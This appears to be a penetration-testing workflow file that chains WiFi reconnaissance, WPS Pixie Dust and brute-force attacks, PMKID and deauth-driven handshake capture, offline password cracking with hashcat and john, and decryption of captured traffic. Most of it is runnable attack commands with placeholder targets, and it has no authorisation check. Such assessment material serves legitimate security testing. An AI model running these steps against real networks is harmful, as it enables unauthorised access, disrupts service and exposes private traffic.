# Workflow: Full Wireless Assessment

**ID:** 08_wireless_full
**Risk Level:** HIGH — Active attacks, monitor mode, deauth, cracking
**Estimated Duration:** 30-180 minutes
**Requires:** Root privileges, monitor-mode WiFi adapter, HackRF optional

## Objective

Comprehensive wireless security assessment combining passive recon, WPS attacks,
PMKID/handshake capture, and offline hash cracking in a single chain.

## Pre-Flight Checks

1. **Monitor mode interface:** `cat /sys/class/net/wlan0mon/type` (should be 803)
    - If not: `sudo airmon-ng start wlan0`
2. **Tools available:** `which reaver wash hcxdumptool hcxpcapngtool hashcat john aircrack-ng`
3. **Wordlists:** `ls /usr/share/wordlists/rockyou.txt tactical/wordlists/`

## Steps

### Step 1: WiFi Reconnaissance

```bash
npx tsx tactical/modules/module_runner.ts wifi_recon \
  --type ap --min-signal -75
```

**Record:** All APs — BSSID, SSID, channel, encryption, client count.
**Select targets:** Prioritize by signal strength and client count.

### Step 2: WPS Discovery

```bash
npx tsx tactical/modules/module_runner.ts wps_attacker \
  --tool wash --interface wlan0mon --duration 30
```

**If WPS-enabled targets found:** Proceed to Step 3A (faster path).
**If no WPS:** Skip to Step 4 (PMKID/handshake path).

### Step 3A: WPS Pixie Dust Attack

```bash
npx tsx tactical/modules/module_runner.ts wps_attacker \
  --tool reaver --bssid <BSSID> --interface wlan0mon --pixie-dust
```

**If PIN found:** WPA passphrase recovered. Record and move to next target.
**If Pixie Dust fails:** Try online brute-force (slow, hours):

```bash
npx tsx tactical/modules/module_runner.ts wps_attacker \
  --tool reaver --bssid <BSSID> --interface wlan0mon --timeout 3600
```

### Step 4: PMKID Capture (clientless)

Try PMKID first — no deauth needed, works without connected clients:

```bash
npx tsx tactical/modules/module_runner.ts wifi_capture \
  --interface wlan0mon --filter-bssid <BSSID> --duration 120
```

**If `pmkid_count > 0`:** Skip to Step 6 (cracking).
**If no PMKID:** Proceed to Step 5 (deauth + handshake).

### Step 5: Deauth + Handshake Capture

```bash
npx tsx tactical/modules/module_runner.ts wifi_deauth \
  --bssid <BSSID> --interface wlan0mon --count 15

npx tsx tactical/modules/module_runner.ts wifi_handshake \
  --bssid <BSSID> --interface wlan0 --channel <CH> --timeout 180
```

**If handshake captured:** Proceed to cracking.
**If failed:** Retry with broadcast deauth (omit --client), max 3 attempts.

### Step 6: Offline Hash Cracking

```bash
# Try hashcat first (GPU-accelerated if available)
npx tsx tactical/modules/module_runner.ts hash_cracker \
  --tool hashcat --hash-file /path/to/hashes \
  --hash-type 22000 --wordlist /usr/share/wordlists/rockyou.txt

# Fallback to john
npx tsx tactical/modules/module_runner.ts hash_cracker \
  --tool john --hash-file /path/to/hashes \
  --wordlist /usr/share/wordlists/rockyou.txt
```

**Record:** Cracked passwords, time taken.

### Step 7: Traffic Decryption (if password recovered)

```bash
npx tsx tactical/modules/module_runner.ts wifi_decrypt \
  --pcap-file /path/to/capture.pcap \
  --bssid <BSSID> --passphrase "<RECOVERED_PASSWORD>"
```

**Record:** Decrypted packet count, protocols observed.

## Abort Conditions

- Monitor mode interface lost
- 3 consecutive failures at any step
- Target AP no longer visible
- Account lockout on WPS (rate-limited)

## Reporting

- Targets assessed: BSSID, SSID, encryption, WPS status
- WPS results: Pixie Dust success/fail, PIN found
- PMKID captured: yes/no per target
- Handshakes captured: yes/no per target
- Passwords cracked: SSID → password, method used, time
- Decrypted traffic: protocol breakdown, interesting findings
- Recommendations: WPS disable, stronger passphrases, WPA3 migration
